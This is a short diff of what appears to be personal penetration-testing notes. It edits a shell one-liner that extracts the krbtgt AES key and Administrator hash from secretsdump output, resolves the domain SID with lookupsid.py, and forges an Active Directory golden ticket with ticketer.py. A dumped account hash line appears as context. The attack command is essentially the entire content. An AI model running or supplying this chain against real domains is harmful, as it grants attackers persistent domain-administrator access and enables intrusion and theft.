@@ -651,7 +651,7 @@ DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c0
 Craft golden ticket via my sweat **golden ticket one liner**
 
 ```bash
-export DOMAIN="$(pt get domain)";export AESKEY=$(cat secretsdump.ntds.kerberos|grep krbtgt|head -n1|cut -d":" -f3); export DOMAINSID=$(lookupsid.py $domain/'Administrator'@$DOMAIN 1 -hashes '0:'$(cat secretsdump.ntds|grep Administrator|cut -d ":" -f 4)|tail -n1|cut -d ":" -f 2| xargs); ticketer.py -aesKey $AESKEY -domain-sid $DOMAINSID -domain $DOMAIN Administrator
+DOMAIN="$(pt get domain)"; AESKEY=$(cat secretsdump.ntds.kerberos | grep '^krbtgt:' | head -n1 | cut -d":" -f3); DOMAINSID=$(lookupsid.py $domain/'Administrator'@$DOMAIN 1 -hashes '0:'$(cat secretsdump.ntds | grep Administrator | cut -d ":" -f 4) | tail -n1 | cut -d ":" -f 2 | xargs); ticketer.py -aesKey $AESKEY -domain-sid $DOMAINSID -domain $DOMAIN Administrator
 ```
 
 ^f4e2dd
